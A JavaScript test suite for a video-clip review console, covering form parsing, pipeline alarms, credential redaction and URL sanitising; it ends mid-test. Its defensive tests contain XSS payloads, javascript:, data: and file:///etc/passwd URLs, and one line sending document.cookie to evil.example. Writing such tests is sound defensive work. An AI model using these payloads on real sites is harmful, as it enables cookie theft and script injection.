const assert = require('node:assert/strict');
const test = require('node:test');
const fs = require('node:fs');
const path = require('node:path');

const {
  heldBoard, stuckBoard, pipelineBoard, channelBoard, publishedBoard,
  parseApproveForm, parseRejectForm, parsePriorityForm,
  buildAlarms, starvedStages, pager, navBar, clipItem, approveForm,
  timecode, ago, hoursSince, sourceLink, momentQueue, clipQueue,
  driveHref, redact, zonedToIso,
} = require('../hosts/review/render');
const { groupErrors } = require('../hosts/review/summarise');

// A fixed clock, so an age assertion does not drift with the wall clock.
const NOW = Date.parse('2026-10-12T12:00:00Z');
const hoursAgo = (hours) => new Date(NOW - hours * 3600000).toISOString();
const daysAgo = (days) => new Date(NOW - days * 86400000).toISOString();

// ---------------------------------------------------------------------------
// Primitives
// ---------------------------------------------------------------------------

test('a timecode is minutes and padded seconds, and nonsense renders as nothing', () => {
  assert.equal(timecode(0), '0:00');
  assert.equal(timecode(42), '0:42');
  assert.equal(timecode(723), '12:03');
  assert.equal(timecode(-1), '');
  assert.equal(timecode(null), '');
  assert.equal(timecode('abc'), '');
});

test('ages are rendered as a span to judge, not a timestamp to subtract', () => {
  assert.equal(ago(hoursAgo(0.005), NOW), 'just now');
  assert.equal(ago(hoursAgo(0.5), NOW), '30m');
  assert.equal(ago(hoursAgo(5), NOW), '5h');
  assert.equal(ago(daysAgo(6), NOW), '6d');
  assert.equal(ago(null, NOW), '');
  assert.equal(ago('not a date', NOW), '');
});

test('hoursSince is negative for a time still to come, which is how expiry is read', () => {
  assert.equal(Math.round(hoursSince(hoursAgo(3), NOW)), 3);
  assert.ok(hoursSince(new Date(NOW + 86400000).toISOString(), NOW) < 0);
  assert.equal(hoursSince(null, NOW), null);
});

// The link is the point of the feature: it lands on the source episode at the
// exact second the clip was cut from.
test('a source link carries the cut timestamp and refuses anything not https', () => {
  const link = sourceLink('https://www.youtube.com/watch?v=abc', 723);
  assert.match(link, /t=723s/);
  // Escaped, because it is going into an attribute: the separator is appended
  // to the existing query string rather than replacing it.
  assert.match(link, /watch\?v=abc&amp;t=723s/);
  assert.match(link, /source at 12:03/);
  assert.match(link, /rel="noreferrer noopener"/);

  assert.match(sourceLink('https://youtu.be/abc', 0), /href="https:\/\/youtu\.be\/abc"/);
  assert.doesNotMatch(sourceLink('https://youtu.be/abc', 0), /t=0s/);
  assert.equal(sourceLink('javascript:alert(1)', 10), '');
  assert.equal(sourceLink('http://insecure.example', 10), '');
  assert.equal(sourceLink('', 10), '');
});

test('the pager says what it is hiding instead of truncating in silence', () => {
  assert.equal(pager({ path: '/', offset: 0, limit: 25, total: 12 }), '',
    'no pager when everything fits');
  const first = pager({ path: '/', offset: 0, limit: 25, total: 60 });
  assert.match(first, /1–25 of 60/);
  assert.match(first, /offset=25/);
  assert.doesNotMatch(first, /newer/, 'there is nothing newer than the first page');
  const last = pager({ path: '/', offset: 50, limit: 25, total: 60 });
  assert.match(last, /51–60 of 60/);
  assert.doesNotMatch(last, /older/);
});

test('the navigation carries the counts, and distinguishes zero from unknown', () => {
  const html = navBar({ clips: 12, moments: 0 }, '/');
  assert.match(html, /aria-current="page"/);
  assert.match(html, />12</);
  assert.match(html, /data-zero/, 'a zero count is muted rather than shouted');
  // A count that was not read renders no number at all rather than a wrong 0.
  assert.doesNotMatch(navBar({}, '/'), /class="n"/);
});

// ---------------------------------------------------------------------------
// Approve and reject parsing
// ---------------------------------------------------------------------------

test('the chosen alternative title is used when nothing is typed', () => {
  const { values, errors } = parseApproveForm(new URLSearchParams(
    'created_clip_id=c1&title_choice=A+Better+Title&final_title=&platforms=TIKTOK'));
  assert.deepEqual(errors, {});
  assert.equal(values.p_final_title, 'A Better Title');
});

// The suggested radio is pre-checked, so an operator who types a title and
// leaves the radio alone meant the typed one. Silently publishing the AI title
// instead was the bug.
test('a typed title wins over the pre-checked radio', () => {
  const { values } = parseApproveForm(new URLSearchParams(
    'created_clip_id=c1&title_choice=AI+Suggested&final_title=Mine&platforms=TIKTOK'));
  assert.equal(values.p_final_title, 'Mine');
});

test('"write my own" falls back to what was typed', () => {
  const { values, errors } = parseApproveForm(new URLSearchParams(
    'created_clip_id=c1&title_choice=__custom&final_title=My+Own&platforms=TIKTOK'));
  assert.deepEqual(errors, {});
  assert.equal(values.p_final_title, 'My Own');
});

test('"write my own" with an empty box is an error, not an empty title', () => {
  const { errors } = parseApproveForm(new URLSearchParams(
    'created_clip_id=c1&title_choice=__custom&final_title=+&platforms=TIKTOK'));
  assert.match(errors.final_title, /title/i);
});

// The old failure path showed a bare error page with a Back link, so a caption
// the operator had just written was gone.
test('a failed approval hands back everything typed so the form can be refilled', () => {
  const { errors, form } = parseApproveForm(new URLSearchParams(
    'created_clip_id=c1&final_title=Kept&final_caption=A+caption+worth+keeping'
    + '&hashtags=%23one+%23two&scheduled_at=2026-10-20T09:00'));
  assert.match(errors.platforms, /at least one platform/i);
  assert.equal(form.final_title, 'Kept');
  assert.equal(form.final_caption, 'A caption worth keeping');
  assert.equal(form.hashtags, '#one #two');
  assert.equal(form.scheduled_at, '2026-10-20T09:00');
  assert.deepEqual(form.platforms, []);
});

test('the refilled form restores the ticks and the caption it was given', () => {
  const html = approveForm(
    { created_clip_id: 'c1' },
    { final_caption: 'Restored', platforms: ['TIKTOK'], final_title: 'Restored title' },
    { platforms: 'Tick at least one platform.' },
  );
  assert.match(html, /Restored/);
  assert.match(html, /value="TIKTOK" checked/);
  assert.doesNotMatch(html, /value="YOUTUBE_SHORTS" checked/);
  assert.match(html, /Tick at least one platform\./);
});

test('reviewer notes reach the RPC, which has always accepted them', () => {
  const { values } = parseApproveForm(new URLSearchParams(
    'created_clip_id=c1&final_title=T&platforms=TIKTOK&reviewer_notes=Trimmed+the+intro'));
  assert.equal(values.p_reviewer_notes, 'Trimmed the intro');
  const blank = parseApproveForm(new URLSearchParams(
    'created_clip_id=c1&final_title=T&platforms=TIKTOK&reviewer_notes=++'));
  assert.equal(blank.values.p_reviewer_notes, null, 'blank notes must not overwrite with an empty string');
});

// A datetime-local value has no zone, and the container runs in UTC. Read
// naively, a 09:00 Nairobi pick went out at 12:00 Nairobi.
test('a publish time is read in the operator\'s named zone, not the container\'s', () => {
  const { values } = parseApproveForm(new URLSearchParams(
    'created_clip_id=c1&final_title=T&platforms=TIKTOK&scheduled_at=2026-10-20T09:00'),
  { timeZone: 'Africa/Nairobi' });
  assert.equal(values.p_scheduled_at, '2026-10-20T06:00:00.000Z');
  assert.equal(zonedToIso('2026-10-20T09:00', 'UTC'), '2026-10-20T09:00:00.000Z');
  // Across a DST change: London is UTC+1 in July and UTC+0 in January.
  assert.equal(zonedToIso('2026-07-01T09:00', 'Europe/London'), '2026-07-01T08:00:00.000Z');
  assert.equal(zonedToIso('2026-01-15T09:00', 'Europe/London'), '2026-01-15T09:00:00.000Z');
  assert.equal(zonedToIso('tomorrow', 'UTC'), null);
});

test('an unreadable schedule is reported rather than sent as Invalid Date', () => {
  const { errors } = parseApproveForm(new URLSearchParams(
    'created_clip_id=c1&final_title=T&platforms=TIKTOK&scheduled_at=yesterday'));
  assert.match(errors.scheduled_at, /time/i);
});

test('rejecting requires a reason from the list', () => {
  assert.match(parseRejectForm(new URLSearchParams('created_clip_id=c1')).errors.reject_reason, /reason/i);
  assert.match(parseRejectForm(new URLSearchParams(
    'created_clip_id=c1&reject_reason=BECAUSE_I_SAID')).errors.reject_reason, /reason/i);
});

test('a rejection records the reason, the note and the link as one line', () => {
  const { values, errors } = parseRejectForm(new URLSearchParams(
    'created_clip_id=c1&reject_reason=WRONG_CUT&reject_note=Starts+mid-sentence'
    + '&reject_link=https%3A%2F%2Fexample.com%2Fbetter'));
  assert.deepEqual(errors, {});
  assert.equal(values.p_created_clip_id, 'c1');
  assert.equal(values.p_reviewer_notes,
    'WRONG_CUT — Starts mid-sentence — ref: https://example.com/better');
});

test('a failed reject reopens its fold with the reason, the choices and the error', () => {
  const { errors, form } = parseRejectForm(new URLSearchParams(
    'created_clip_id=c1&reject_reason=OTHER&reject_note=keep+me&reject_link=ftp%3A%2F%2Fx'));
  const html = approveForm({ created_clip_id: 'c1' }, form, errors);
  assert.match(html, /<details open>/);
  assert.match(html, /must start with http/);
  assert.match(html, /value="OTHER" selected/);
  assert.match(html, />keep me</);
});

test('a reference link that is not a link is refused', () => {
  const { errors } = parseRejectForm(new URLSearchParams(
    'created_clip_id=c1&reject_reason=OTHER&reject_link=drive.google.com/x'));
  assert.match(errors.reject_link, /http/);
});

test('priority is bounded, because it orders the whole fetch queue', () => {
  assert.deepEqual(parsePriorityForm(new URLSearchParams('source_id=s1&priority=3')).errors, {});
  for (const bad of ['0', '100', '-1', '2.5', '', 'high']) {
    assert.match(parsePriorityForm(new URLSearchParams(`source_id=s1&priority=${bad}`)).errors.priority,
      /whole number/i, `${bad} should be refused`);
  }
  for (const good of ['1', '99']) {
    assert.deepEqual(parsePriorityForm(new URLSearchParams(`source_id=s1&priority=${good}`)).errors, {});
  }
  // Without an id the patch filter would be eq.null and do nothing silently.
  assert.match(parsePriorityForm(new URLSearchParams('priority=3')).errors.source_id, /channel/i);
});

test('a priority error is shown on the channels screen', () => {
  const html = channelBoard({ channels: [], errors: { priority: 'Priority is a whole number from 1 to 99.' } });
  assert.match(html, /class="err">Priority is a whole number/);
});

// ---------------------------------------------------------------------------
// Alarms
// ---------------------------------------------------------------------------

test('a niche with no active channel is an alarm, since it produces nothing for ever', () => {
  const alarms = buildAlarms({
    channels: [
      { source_id: 'a', niche: 'FINANCE_BUSINESS', active_status: false, auto_paused_at: daysAgo(10) },
      { source_id: 'b', niche: 'FINANCE_BUSINESS', active_status: false, auto_paused_at: daysAgo(9) },
      { source_id: 'c', niche: 'CHRISTIAN_CONTENT', active_status: true },
    ],
  }, NOW);
  const dark = alarms.filter((alarm) => alarm.kind === 'niche-dark');
  assert.equal(dark.length, 1);
  assert.match(dark[0].what, /finance business has no active channel/);
  assert.match(dark[0].why, /auto-paused/);
});

test('a channel auto-paused in the last day is surfaced with its reason', () => {
  const alarms = buildAlarms({
    channels: [{
      source_id: 'a', source_name: 'Example TV', niche: 'N', active_status: true,
      auto_paused_at: hoursAgo(3), auto_paused_reason: 'skip rate above 0.8',
    }],
  }, NOW);
  const paused = alarms.find((alarm) => alarm.kind === 'auto-paused');
  assert.match(paused.what, /Example TV was auto-paused 3h ago/);
  assert.match(paused.why, /skip rate above 0\.8/);
});

test('an expiring or lapsed publishing credential is an alarm; a healthy one is not', () => {
  const alarms = buildAlarms({
    publishingChannels: [
      { channel_id: 'yt-1', platform: 'YOUTUBE_SHORTS', token_expires_at: new Date(NOW + 5 * 86400000).toISOString() },
      { channel_id: 'tt-1', platform: 'TIKTOK', token_expires_at: daysAgo(2) },
      { channel_id: 'ig-1', platform: 'INSTAGRAM_REELS', token_expires_at: new Date(NOW + 90 * 86400000).toISOString() },
      { channel_id: 'fb-1', platform: 'FACEBOOK_REELS', token_expires_at: null },
    ],
  }, NOW);
  const tokens = alarms.filter((alarm) => alarm.kind === 'token');
  assert.equal(tokens.length, 2);
  assert.match(tokens[0].what, /youtube shorts credential expires in 5 days/);
  assert.match(tokens[1].what, /tiktok credential expired 2d ago/);
});

test('an unreadable token expiry says so rather than "expires in 0 days"', () => {
  const [alarm] = buildAlarms({
    publishingChannels: [{ channel_id: 'yt-1', platform: 'YOUTUBE_SHORTS', token_expires_at: 'soon' }],
  }, NOW);
  assert.match(alarm.what, /expiry is unreadable/);
  assert.doesNotMatch(alarm.what, /0 days/);
});

test('a job claimed long ago and never finished means the worker went away', () => {
  const alarms = buildAlarms({
    leases: [
      { publish_id: 'p1', platform: 'TIKTOK', publish_status: 'UPLOADING', claimed_at: hoursAgo(6), claimed_by: 'runner-2' },
      { publish_id: 'p2', platform: 'TIKTOK', publish_status: 'CLAIMED', claimed_at: hoursAgo(0.2) },
    ],
  }, NOW);
  const leases = alarms.filter((alarm) => alarm.kind === 'lease');
  assert.equal(leases.length, 1, 'a lease taken minutes ago is just work in progress');
  assert.match(leases[0].what, /tiktok job p1 claimed 6h ago/);
  assert.match(leases[0].why, /runner-2/);
});

// This is the "a workflow died" detector, and it is the one alarm that is
// inferred rather than measured, so it must say so and must not cry wolf.
test('a starved stage names its own consumer, judged by that consumer\'s output', () => {
  const stages = [
    { position: 5, stage: 'Awaiting download', consumer: 'WF6 yt-dlp clip download', alarm_on_stall: true, waiting: 9, oldest_waiting: hoursAgo(31), last_activity: hoursAgo(31), consumer_last_output: hoursAgo(33) },
    { position: 6, stage: 'Awaiting render', consumer: 'WF8c FFmpeg render', alarm_on_stall: true, waiting: 0, oldest_waiting: null, last_activity: hoursAgo(33), consumer_last_output: hoursAgo(1) },
  ];
  const starved = starvedStages(stages, NOW);
  assert.equal(starved.length, 1);
  assert.equal(starved[0].what, 'WF6 yt-dlp clip download may have stopped');
  assert.match(starved[0].why, /9 waiting at awaiting download, oldest 31h/);
  assert.match(starved[0].why, /last produced anything 33h ago/);
  assert.match(starved[0].why, /Inferred from timestamps/);
});

// When one workflow stops, the stages after it drain to zero and raise
// nothing. So two starved stages are two outages, and hiding the second as a
// "consequence" of the first was hiding a real one.
test('two independently stalled consumers are both reported', () => {
  const stages = [
    { position: 5, stage: 'Awaiting download', consumer: 'WF6', alarm_on_stall: true, waiting: 4, oldest_waiting: hoursAgo(37), consumer_last_output: hoursAgo(37) },
    { position: 6, stage: 'Awaiting render', consumer: 'WF8c', alarm_on_stall: true, waiting: 3, oldest_waiting: hoursAgo(20), consumer_last_output: hoursAgo(20) },
  ];
  assert.deepEqual(starvedStages(stages, NOW).map((alarm) => alarm.what),
    ['WF6 may have stopped', 'WF8c may have stopped']);
});

// The last stage has no stage after it, so judging by the next stage's
// arrivals could never alarm on a dead publisher.
test('the last stage alarms too: a dead publisher is not silent', () => {
  const [alarm] = starvedStages([
    { position: 9, stage: 'Awaiting publish', consumer: 'WF12 publish to platforms', alarm_on_stall: true, waiting: 5, oldest_waiting: hoursAgo(12), consumer_last_output: hoursAgo(30) },
  ], NOW);
  assert.equal(alarm.what, 'WF12 publish to platforms may have stopped');
});

// WF3's output cannot be dated (candidate_videos has no updated_at), so the
// backlog's age decides, and the alarm says that is all it is.
test('a stage whose output cannot be dated is judged on its backlog alone', () => {
  const [alarm] = starvedStages([
    { position: 2, stage: 'New candidates', consumer: 'WF3', alarm_on_stall: true, waiting: 31, oldest_waiting: hoursAgo(40), consumer_last_output: null },
  ], NOW);
  assert.match(alarm.why, /cannot be dated/);
});

// Two stages have a backlog that means something other than a stopped
// workflow: the source fleet is a fleet, and the review queue is a person.
test('a stage whose backlog does not implicate a workflow never raises one', () => {
  assert.deepEqual(starvedStages([
    { position: 1, stage: 'Source channels', consumer: 'WF1, WF2', alarm_on_stall: false, waiting: 9, oldest_waiting: daysAgo(5), last_activity: daysAgo(5) },
    { position: 2, stage: 'New candidates', consumer: 'WF3', alarm_on_stall: false, waiting: 31, oldest_waiting: daysAgo(5), last_activity: daysAgo(5) },
    { position: 3, stage: 'Awaiting transcript', consumer: 'WF4', alarm_on_stall: false, waiting: 2, oldest_waiting: daysAgo(5), last_activity: daysAgo(5) },
  ], NOW), []);
});

// One quiet scheduled cycle is normal; the threshold is what keeps the alarm
// worth reading.
test('a stage quiet for less than the threshold is not yet starved', () => {
  assert.deepEqual(starvedStages([
    { position: 5, stage: 'A', consumer: 'WF6', alarm_on_stall: true, waiting: 9, oldest_waiting: hoursAgo(5), consumer_last_output: hoursAgo(5) },
  ], NOW), []);
});

// A backlog can age behind a consumer that is alive but rate-limited (WF4's
// fetches, WF6's per-run cap). Recent output means slow, not stopped.
test('a stage whose consumer is still producing is not starved', () => {
  assert.deepEqual(starvedStages([
    { position: 5, stage: 'Awaiting download', consumer: 'WF6', alarm_on_stall: true, waiting: 9, oldest_waiting: hoursAgo(31), consumer_last_output: hoursAgo(0.5) },
  ], NOW), []);
});

test('an empty stage is never starved, however long the next one has been quiet', () => {
  assert.deepEqual(starvedStages([
    { position: 5, stage: 'Awaiting download', consumer: 'WF6', waiting: 0, oldest_waiting: null, last_activity: daysAgo(30) },
    { position: 6, stage: 'Awaiting render', consumer: 'WF8c', waiting: 0, oldest_waiting: null, last_activity: daysAgo(30) },
  ], NOW), []);
});

// Alarm text is built from database columns an operator never typed, so it
// goes through the same escaping as everything else.
test('alarm text from the database is escaped before it reaches the page', () => {
  const html = pipelineBoard({
    alarms: buildAlarms({
      channels: [{
        source_id: 'a', source_name: '<img src=x onerror=alert(1)>', niche: 'N',
        active_status: true, auto_paused_at: hoursAgo(1), auto_paused_reason: '"><script>alert(1)</script>',
      }],
    }, NOW),
  }, NOW);
  assert.doesNotMatch(html, /<img src=x/);
  assert.doesNotMatch(html, /<script>alert/);
  assert.match(html, /&lt;img src=x/);
});

// ---------------------------------------------------------------------------
// Summaries
// ---------------------------------------------------------------------------

test('errors group by workflow and node, keeping the newest message', () => {
  const grouped = groupErrors([
    { workflow_name: 'WF6', node_name: 'Download', error_message: 'newest', created_at: hoursAgo(1) },
    { workflow_name: 'WF6', node_name: 'Download', error_message: 'older', created_at: hoursAgo(5) },
    { workflow_name: 'WF12', node_name: 'Upload', error_message: 'one', created_at: hoursAgo(2) },
  ]);
  assert.equal(grouped.length, 2);
  assert.equal(grouped[0].workflow_name, 'WF6');
  assert.equal(grouped[0].count, 2);
  assert.equal(grouped[0].error_message, 'newest');
});

test('the error roll-up carries no payload column through to the page', () => {
  const grouped = groupErrors([{
    workflow_name: 'WF6', node_name: 'Download', error_message: 'failed',
    created_at: hoursAgo(1), raw_payload: { apikey: 'service-role-secret' },
  }]);
  assert.equal(grouped[0].raw_payload, undefined);
  assert.doesNotMatch(JSON.stringify(grouped), /service-role-secret/);
});

// Error text comes from workflows and providers, and HTTP errors quote the
// request they made.
test('error text is stripped of anything shaped like a credential and kept short', () => {
  const text = redact('GET https://graph.example/v1?access_token=EAAB123&x=1 failed: Authorization: Bearer abc.def apikey=k1');
  assert.doesNotMatch(text, /EAAB123|abc\.def|k1\b/);
  assert.match(text, /access_token=\[redacted\]&x=1/);
  assert.equal(redact('x'.repeat(500)).length, 301);
  const html = stuckBoard({ moments: [{ clip_moment_id: 'm1', error_message: 'token=supersecret', created_at: hoursAgo(1) }] }, NOW);
  assert.doesNotMatch(html, /supersecret/);
});

// ---------------------------------------------------------------------------
// Screens
// ---------------------------------------------------------------------------

test('held explains that a flagged video is stuck because nothing accepts it', () => {
  const html = heldBoard({
    flagged: [{
      video_id: 'v1', video_title: 'An Interview', source_name: 'Example TV',
      video_url: 'https://www.youtube.com/watch?v=v1',
      rejection_reason: 'MANUAL_APPROVAL_REQUIRED', created_at: daysAgo(3),
    }],
  });
  assert.match(html, /WF4 takes only VALID/);
  assert.match(html, /from a high-risk channel/, 'the machine code is rendered as prose');
  assert.match(html, /name="video_id" value="v1"/);
  assert.match(html, /action="\/held\/release"/);
});

test('held offers an override for a gate rejection and a reopen for your own', () => {
  const html = heldBoard({
    rejected: [{ video_id: 'v2', video_title: 'Too Short', rejection_reason: 'TOO_SHORT', created_at: daysAgo(1) }],
    clips: [{ created_clip_id: 'c9', clip_title: 'A Clip', reviewer_notes: 'WRONG_CUT — starts late', created_at: daysAgo(2) }],
    reasonCounts: [{ reason: 'LOW_ENGAGEMENT', count: 31 }],
  });
  assert.match(html, />Override</);
  assert.match(html, /action="\/clips\/reopen"/);
  assert.match(html, /WRONG_CUT — starts late/);
  assert.match(html, /engagement below the gate/);
  assert.match(html, />31</);
  assert.match(html, /threshold worth changing/, 'the screen should push toward fixing the gate');
});

// Release sends a video back to WF4. WF4's own rejection would come straight
// back (and spend another transcript fetch); a channel auto-pause would too.
test('held offers no release that cannot work', () => {
  const html = heldBoard({
    rejected: [
      { video_id: 'v3', rejection_reason: 'TRANSCRIPT_NO_CAPTIONS', created_at: daysAgo(1) },
      { video_id: 'v4', rejection_reason: 'Channel auto-paused: skip rate', created_at: daysAgo(1) },
    ],
  });
  assert.doesNotMatch(html, /value="v3"/);
  assert.doesNotMatch(html, /value="v4"/);
  assert.match(html, /WF4 would reject it again/);
  assert.match(html, /no usable transcript \(no captions\)/);
  assert.match(html, /href="\/channels">Reactivate the channel/);
});

test('a capped list says how much it is not showing', () => {
  const html = heldBoard({
    rejected: [{ video_id: 'v2', rejection_reason: 'TOO_SHORT', created_at: daysAgo(1) }],
    totals: { rejected: 212 },
  });
  assert.match(html, /newest 1 of 212/);
});

test('an empty held screen invites rather than showing three empty tables', () => {
  const html = heldBoard({});
  assert.match(html, /Nothing is held/);
  assert.doesNotMatch(html, /<table/);
});

// The one thing this screen must never do is print a provider payload.
test('stuck shows the operator-facing error and never the raw payload', () => {
  const html = stuckBoard({
    publishes: [{
      publish_id: 'p1', platform: 'TIKTOK', publish_status: 'FAILED',
      last_error: 'upload rejected: video too long', retry_count: 3, created_at: hoursAgo(4),
      provider_response: { access_token: 'tok-secret' },
      postiz_submit_payload: { apikey: 'postiz-secret' },
      payload: { authorization: 'Bearer leaked' },
    }],
    renders: [{ render_id: 'r1', niche: 'N', error_message: 'ffmpeg exit 1', created_at: hoursAgo(9) }],
  }, NOW);
  assert.match(html, /upload rejected: video too long/);
  assert.match(html, /ffmpeg exit 1/);
  assert.doesNotMatch(html, /tok-secret|postiz-secret|leaked/);
  assert.match(html, /action="\/publishes\/retry"/);
});

// Postiz may already have posted these; requeueing loops them through claim
// and lease expiry while looking handled.
test('a publish that needs reconciliation is not offered "Queue again"', () => {
  const html = stuckBoard({
    publishes: [
      { publish_id: 'p1', platform: 'TIKTOK', publish_status: 'FAILED', last_error: 'POSTIZ_RECONCILIATION_REQUIRED', created_at: hoursAgo(1) },
      { publish_id: 'p2', platform: 'TIKTOK', publish_status: 'FAILED', last_error: 'x', postiz_submitted_at: hoursAgo(2), created_at: hoursAgo(1) },
    ],
  }, NOW);
  assert.doesNotMatch(html, /action="\/publishes\/retry"/);
  assert.match(html, /Check Postiz first/);
});

test('stuck is empty-stated rather than rendering four empty tables', () => {
  assert.match(stuckBoard({}), /Nothing is stuck/);
});

test('the pipeline table says its liveness is inferred, not measured', () => {
  const html = pipelineBoard({
    stages: [{
      position: 7, stage: 'Awaiting your review', consumer: 'you',
      waiting: 4, oldest_waiting: daysAgo(3), last_activity: hoursAgo(2),
    }],
    throughput: [{ day: '2026-10-12', created: 0, approved: 0, rejected: 0 }],
  }, NOW);
  assert.match(html, /cannot read n8n's execution log/);
  assert.match(html, /Awaiting your review/);
  assert.match(html, /class="warn"/, 'work older than a day is marked');
  assert.match(html, /Nothing is asking for attention/);
  assert.match(html, /No errors logged/);
});

test('channels can be reactivated, switched off and re-prioritised from the list', () => {
  const html = channelBoard({
    channels: [
      { source_id: 's1', source_name: 'Paused One', niche: 'N', active_status: false, auto_paused_at: daysAgo(2), auto_paused_reason: 'skip rate', priority: 2, channel_skip_rate: 0.82, last_checked_at: daysAgo(2) },
      { source_id: 's2', source_name: 'Live One', niche: 'N', active_status: true, priority: 1, channel_skip_rate: null, last_checked_at: hoursAgo(1) },
    ],
  }, NOW);
  assert.match(html, />Reactivate</);
  assert.match(html, />Switch off</);
  assert.match(html, /action="\/channels\/priority"/);
  assert.match(html, /82%/);
  assert.match(html, /auto-paused/);
  // The add form stays, under the fleet rather than instead of it.
  assert.match(html, /action="\/channels"/);
  assert.match(html, /WF1 resolves both from the URL/);
});

test('published links out to the post and flags a credential about to lapse', () => {
  const html = publishedBoard({
    jobs: [{ created_clip_id: 'c1', title: 'A Clip', niche: 'N', platform: 'TIKTOK', publish_status: 'PUBLISHED', post_url: 'https://tiktok.com/@x/1', completed_at: hoursAgo(5) }],
    credentials: [
      { channel_id: 'tt-1', platform: 'TIKTOK', publishing_backend: 'POSTIZ', enabled_status: true, last_health_status: 'OK', token_expires_at: new Date(NOW + 3 * 86400000).toISOString() },
      { channel_id: 'yt-1', platform: 'YOUTUBE_SHORTS', publishing_backend: 'DIRECT', enabled_status: true, last_health_status: 'OK', token_expires_at: new Date(NOW + 200 * 86400000).toISOString() },
    ],
  }, NOW);
  assert.match(html, /https:\/\/tiktok\.com\/@x\/1/);
  assert.match(html, /class="warn"/);
  assert.match(html, /3d/);
  // Stored values shout; the screen does not.
  assert.match(html, />tiktok</);
  assert.doesNotMatch(html, />TIKTOK</);
});

test('a clip item carries a permalink and the source cut, and leaks no key', () => {
  const html = clipItem({
    created_clip_id: 'CLIP-1',
    clip_title: 'Discipline beats motivation',
    google_drive_url: 'https://drive.google.com/file/d/abc/preview',
    niche: 'MOTIVATION_DISCIPLINE',
    duration_seconds: 42,
    clip_score: 8.4,
    rights_risk: 'MODERATE',
    risk_warning: 'Commentary required before posting.',
    hook: 'You do not need motivation.',
    source_video_url: 'https://www.youtube.com/watch?v=abc',
    start_sec: 723,
    end_sec: 765,
    alternative_titles: ['Why discipline wins', 'Motivation is a liar'],
  });
  assert.match(html, /href="\/clips\/CLIP-1"/);
  assert.match(html, /t=723s/);
  assert.match(html, /cut 12:03–12:45/);
  assert.match(html, /score 8\.4/);
  assert.match(html, /rights moderate/);
  assert.match(html, /Commentary required before posting\./);
  assert.match(html, /Why discipline wins/, 'the AI titles are offered rather than retyped');
  assert.doesNotMatch(html, /SUPABASE|service_role|apikey|Bearer/i);
});

// The reject form cannot nest inside the approve form, so it sits outside and
// its controls reach it by id. If that pairing breaks, rejecting silently
// submits the approve form instead.
test('the reject controls point at a form that exists on the page', () => {
  const html = clipItem({ created_clip_id: 'CLIP-1', google_drive_url: 'https://x/y' });
  assert.match(html, /<form method="post" action="\/clips\/reject" id="reject-CLIP-1">/);
  for (const name of ['reject_reason', 'reject_note', 'reject_link']) {
    assert.match(html, new RegExp(`name="${name}"[^>]*form="reject-CLIP-1"`),
      `${name} must be bound to the reject form`);
  }
});

// ---------------------------------------------------------------------------
// Invariants
// ---------------------------------------------------------------------------

// D11: the key lives in postgrest.js. render.js reading the environment at all
// is the first step to it reaching a page, so assert the source, not just the
// output of one call.
test('render.js and summarise.js read no environment', () => {
  for (const file of ['render.js', 'summarise.js']) {
    const source = fs.readFileSync(path.join(__dirname, '..', 'hosts', 'review', file), 'utf8');
    assert.doesNotMatch(source, /process\.env/, `${file} must not read the environment`);
    assert.doesNotMatch(source, /require\(['"]node:(fs|http|child_process)/, `${file} must stay pure`);
  }
});

test('the review service still ships no dependency and no client script', () => {
  const dir = path.join(__dirname, '..', 'hosts', 'review');
  assert.ok(!fs.existsSync(path.join(dir, 'package.json')), 'no package.json means no dependency');
  assert.ok(!fs.existsSync(path.join(dir, 'node_modules')));
  for (const file of fs.readdirSync(dir).filter((name) => name.endsWith('.js'))) {
    const source = fs.readFileSync(path.join(dir, file), 'utf8');
    assert.doesNotMatch(source, /<script/, `${file} must ship no client script`);
    assert.doesNotMatch(source, /\bonclick=|\bonchange=|\bonsubmit=/, `${file} must ship no inline handler`);
  }
});

test('the quality floor the stylesheet promises is actually in it', () => {
  const source = fs.readFileSync(path.join(__dirname, '..', 'hosts', 'review', 'render.js'), 'utf8');
  assert.match(source, /prefers-reduced-motion/);
  assert.match(source, /:focus-visible/);
  assert.match(source, /@media \(min-width: 56rem\)/, 'the two-column layout must be the wide case, not the default');
});

// ---------------------------------------------------------------------------
// URL handling
// ---------------------------------------------------------------------------

// escapeHtml stops a URL breaking out of its attribute. It does not stop
// `javascript:` inside one, which runs on click in an href and on load in an
// iframe src. Every URL on these screens comes from outside: Drive URLs from
// WF8, post URLs straight out of a provider's API response.
test('only http(s) survives as a URL; anything else is not a link', () => {
  const { safeHref } = require('../hosts/review/render');
  assert.equal(safeHref('https://example.com/x'), 'https://example.com/x');
  assert.equal(safeHref('http://example.com/x'), 'http://example.com/x');
  assert.equal(safeHref('  https://example.com/x  '), 'https://example.com/x');
  for (const hostile of [
    'javascript:alert(1)', 'JaVaScRiPt:alert(1)', ' javascript:alert(1)',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'vbscript:msgbox(1)', 'file:///etc/passwd', '//evil.example/x', '', null, undefined,
  ]) {
    assert.equal(safeHref(hostile), '', `${hostile} must not become a URL`);
  }
});

test('a hostile Drive URL renders no iframe rather than an executing one', () => {
  const html = clipItem({ created_clip_id: 'C1', google_drive_url: 'javascript:alert(1)' });
  assert.doesNotMatch(html, /<iframe/);
  assert.doesNotMatch(html, /javascript:/);
  assert.match(html, /No render yet/);
});

// post_url is written from a provider's API response, so it is the least
// trusted string on any of these screens.
test('a hostile post URL from a provider renders as text, not a link', () => {
  const html = publishedBoard({
    jobs: [{ title: 'A Clip', platform: 'TIKTOK', publish_status: 'PUBLISHED',
      post_url: 'javascript:fetch("//evil.example?c="+document.cookie)' }],
  }, NOW);
  assert.doesNotMatch(html, /javascript:/);
  assert.doesNotMatch(html, /<a href/);
  assert.match(html, />published</);
});

test('a hostile source URL renders no link', () => {
  for (const hostile of ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>']) {
    assert.equal(sourceLink(hostile, 10), '');
  }
});

// The Dockerfile copies files by name, so adding a module to this service and
// not to the COPY line ships an image that crash-loops on MODULE_NOT_FOUND.
// Nothing else catches it: every test here passes against the source tree.
test('every source file this service has is copied into its image', () => {
  const dir = path.join(__dirname, '..', 'hosts', 'review');
  const dockerfile = fs.readFileSync(path.join(dir, 'Dockerfile'), 'utf8');
  const copied = dockerfile
    .split('\n')
    .filter((line) => line.startsWith('COPY '))
    .join(' ');
  for (const file of fs.readdirSync(dir).filter((name) => name.endsWith('.js'))) {
    assert.ok(copied.includes(file), `${file} is not COPYed into the image`);
  }
});

// ---------------------------------------------------------------------------
// Review fixes
// ---------------------------------------------------------------------------

// The preview is an iframe inside a console whose buttons override gates.
test('the preview loads only Google Drive, sandboxed without top navigation', () => {
